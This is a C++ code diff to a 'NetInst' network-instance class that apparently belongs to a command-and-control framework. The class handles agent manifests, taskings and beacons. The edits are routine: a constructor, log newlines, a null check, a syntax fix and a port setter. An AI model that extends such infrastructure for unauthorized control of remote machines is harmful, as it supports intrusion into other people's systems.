@@ -11,6 +11,14 @@ NetInst::NetInst(Server *srv, int id, TransportAPI *transport){
     this->int_task_lock = PTHREAD_MUTEX_INITIALIZER;
 }
 
+NetInst::NetInst(Server *srv, int id, Module *mod) {
+    this->task_dispatch = new std::deque<ptask_t>();
+    this->srv = srv;
+    this->id = id;
+    this->tspt = mod->NewTransport();
+    this->int_task_lock = PTHREAD_MUTEX_INITIALIZER;
+}
+
 // class destructor
 NetInst::~NetInst(){
     if(tspt){
@@ -25,7 +33,7 @@ void NetInst::MainLoop(){
 
     // listen on the transport
     if(!api_check(tspt->listen())){
-        log(LOG_FATAL, "API CHECK FAILED ON TRANSPORT LISTEN!");
+        log(LOG_FATAL, "API CHECK FAILED ON TRANSPORT LISTEN!\n");
         log(LOG_INFO, "Terminating network instance...\n");
         ptask_t die = CreateTasking(id, NETINST_TERMINATE, 0, nullptr);
         PushTasking(die);
@@ -33,6 +41,14 @@ void NetInst::MainLoop(){
     }
     
     if(!api_check(tspt->get_aname())) {
+        ptask_t die = CreateTasking(id, NETINST_TERMINATE, 0, nullptr);
+        PushTasking(die);
+        return;
+    }
+    if(!this->t_dat){
+        log(LOG_FATAL, "AGENT NAME IS NULL! Suiciding network instance...\n");
+        ptask_t die = CreateTasking(id, NETINST_TERMINATE, 0, nullptr);
+        PushTasking(die);
         return;
     }
     // first thing we do is request from the server the manifest of the agent
@@ -138,11 +154,11 @@ int NetInst::HandleTask(ptask_t task){
             // push data to the server
             ptask_t beacon = CreateTasking(0, TASK_PUSH_BEACON, strlen(beacon_data), beacon_data);
             PushTasking(beacon);
-            printf("[NETINST] Awaiting task...\n");
+            //printf("[NETINST] Awaiting task...\n");
         }
         break;
     default:
-        log(LOG_ERROR, "Unknown tasking operation: %d", task->type);
+        log(LOG_ERROR, "Unknown tasking operation: %d\n", task->type);
         break;
     }
 
@@ -258,11 +274,11 @@ int NetInst::GetID(){
 
 // returns the agent's identifier
 char* NetInst::GetAgentName() {
-    if(!api_check(tspt->get_aname()){
-        log(LOG_ERROR, "Failed to get agent's name");
+    if(!api_check(tspt->get_aname())){
+        log(LOG_ERROR, "Failed to get agent's name\n");
         return nullptr;
     } else {
-        return t_dat;
+        return (char*)t_dat;
     }
 }
 
@@ -328,6 +344,14 @@ bool NetInst::api_check(api_return api){
 // sets the transport of the structure
 void NetInst::SetTransport(TransportAPI *transport){
     this->tspt = transport;
+}
+
+// sets the port on the transport
+int NetInst::SetTransportPort(int portno) {
+    if(!api_check(tspt->set_port(portno))) {
+        return 1;
+    }
+    return 0;
 }
 
 
